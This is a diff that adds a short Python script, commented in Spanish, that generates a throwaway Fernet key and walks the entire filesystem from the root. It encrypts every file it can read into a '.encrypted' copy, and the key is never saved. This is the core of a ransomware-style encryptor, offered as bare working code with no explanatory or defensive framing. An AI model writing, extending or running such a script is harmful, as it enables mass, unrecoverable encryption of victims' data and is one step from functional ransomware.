@@ -1,0 +1,23 @@
+#!/usr/bin/env python3
+
+import os
+from cryptography.fernet import Fernet
+
+# Genera una clave de cifrado y crea una instancia de Fernet
+key = Fernet.generate_key()
+fernet = Fernet(key)
+
+# Itera sobre cada archivo en el sistema de archivos
+for dirpath, dirnames, filenames in os.walk('/'):
+    for filename in filenames:
+        filepath = os.path.join(dirpath, filename)
+        try:
+            with open(filepath, 'rb') as f:
+                data = f.read()
+                encrypted_data = fernet.encrypt(data)
+                with open(filepath + ".encrypted", 'wb') as ef:
+                    ef.write(encrypted_data)
+                    print(f'File {filepath} encrypted successfully!')
+        except Exception as e:
+            print(f'Error encrypting {filepath}: {e}')
+
